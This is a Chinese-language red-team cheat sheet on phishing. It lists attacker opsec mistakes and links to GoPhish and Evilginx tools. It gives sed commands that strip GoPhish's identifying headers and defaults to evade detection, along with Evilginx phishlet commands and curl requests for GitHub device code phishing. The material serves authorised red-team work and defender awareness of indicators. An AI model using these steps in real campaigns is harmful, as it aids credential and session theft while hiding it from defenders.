# 钓鱼 (Phishing)

> 钓鱼 (Phishing) 是一种网络安全攻击，恶意行为者通过冒充合法机构（如银行、社交媒体平台或电子邮件提供商）来诱导用户泄露密码、信用卡号或个人数据等敏感信息。

## 运维安全 (Opsec) 方面的失误

* **重复使用 IP/域名**：在多个活动或恶意软件家族中使用相同的 IP 地址或域名。
* **没有开启域名隐私保护**：WHOIS 记录暴露了注册人信息（姓名、电子邮件、电话）。
* **相同的注册人电子邮件**：跨域名重复使用相同的电子邮箱地址。
* **未轮换的 SSL 证书**：在钓鱼网站中重复使用自签名或相同的证书。

## GoPhish

* [gophish/gophish](https://github.com/gophish/gophish) - 开源钓鱼映射工具包
* [kgretzky/gophish/](https://github.com/kgretzky/gophish/) - Gophish 与 Evilginx 3.3 的集成
* [puzzlepeaches/sneaky_gophish](https://github.com/puzzlepeaches/sneaky_gophish) - 在蓝队 (Boys in blue) 面前隐藏 GoPhish

```ps1
git clone https://github.com/gophish/gophish.git
go build
```

### 入侵指标 (IOC)

* `X-Gophish-Contact` 和 `X-Gophish-Signature`

    ```ps1
    find . -type f -exec sed -i.bak 's/X-Gophish-Contact/X-Contact/g' {} +
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request_test.go
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog.go
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog_test.go
    sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request.go

    find . -type f -exec sed -i.bak 's/X-Gophish-Signature/X-Signature/g' {} +
    sed -i 's/X-Gophish-Signature/X-Signature/g' webhook/webhook.go
    ```

* 默认服务器名称 (Default server name)

    ```ps1
    sed -i 's/const ServerName = "gophish"/const ServerName = "IGNORE"/' config/config.go
    ```

* 默认 `rid` 参数

    ```ps1
    sed -i 's/const RecipientParameter = "rid"/const RecipientParameter = "keyname"/g' models/campaign.go
    ```

## Evilginx

* [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) - 一个独立的中间人 (man-in-the-middle) 攻击框架，用于钓取登录凭据和会话 Cookie，能够绕过双因素身份验证 (2FA)。
* [evilginxpro](https://evilginx.com/) - 专为红队设计的钓鱼框架。

```ps1
# 列出可用的 Phishlet
phishlets

# 启用一个 Phishlet
phishlets enable <phishlet_name>

# 禁用一个 Phishlet
phishlets disable <phishlet_name>
```

## 设备代码钓鱼 (Device Code Phishing)

* GitHub

    ```ps1
    curl -X POST https://github.com/login/device/code \
    -H "Accept: application/json" \
    -d "client_id=01ab8ac9400c4e429b23&scope=user+repo+workflow"

    curl -X POST https://github.com/login/oauth/access_token \
    -H "Accept: application/json" \
    -d "client_id=01ab8ac9400c4e429b23&device_code=be9<code_from_earlier>&&grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code" -k | jq
    ```

## 参考资料 (References)

* [A Smooth Sea Never Made a Skilled Phisherman - Kuba Gretzky - 8 july 2024](https://youtu.be/Nh99d3YnpI4)
* [Introducing: GitHub Device Code Phishing - John Stawinski, Mason Davis, Matt Jackoski - June 12, 2025](https://www.praetorian.com/blog/introducing-github-device-code-phishing/)
* [Never had a bad day phishing. How to set up GoPhish to evade security controls - Nicholas Anastasi - Jun 30, 2021](https://www.sprocketsecurity.com/blog/never-had-a-bad-day-phishing-how-to-set-up-gophish-to-evade-security-controls)
* [Unraveling and Countering Adversary-in-the-Middle Phishing Attacks - Pawel Partyka - 8 july 2024](https://youtu.be/-W-LxcbUxI4)
